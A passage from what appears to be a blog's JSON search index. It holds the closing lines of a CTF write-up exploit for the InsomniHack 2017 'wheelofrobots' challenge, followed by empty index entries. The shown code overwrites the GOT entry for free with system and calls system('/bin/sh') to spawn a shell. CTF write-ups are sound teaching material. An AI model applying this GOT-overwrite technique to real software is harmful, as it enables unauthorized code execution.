print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), \u0026#39;3\u0026#39;) p.send(b\u0026#39;3\u0026#39;)\t# exit now calls change name, so overwrite GOT free with system print(p.recvuntil(b\u0026#39;name:\u0026#39;).decode(), p64(system)) p.send(p64(system)) change_name(\u0026#39;2\u0026#39;, p64(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)))) remove_bot(\u0026#39;2\u0026#39;)\t# call system with binsh (system(\u0026#39;/bin/sh\\0\u0026#39;)) print(\u0026#39;[+] Shell popped\u0026#39;) break p.interactive() ","date":"10 January 2025","externalUrl":null,"permalink":"/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/","section":"Posts","summary":"","title":"InsomniHack 2017 wheelofrobots Writeup","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]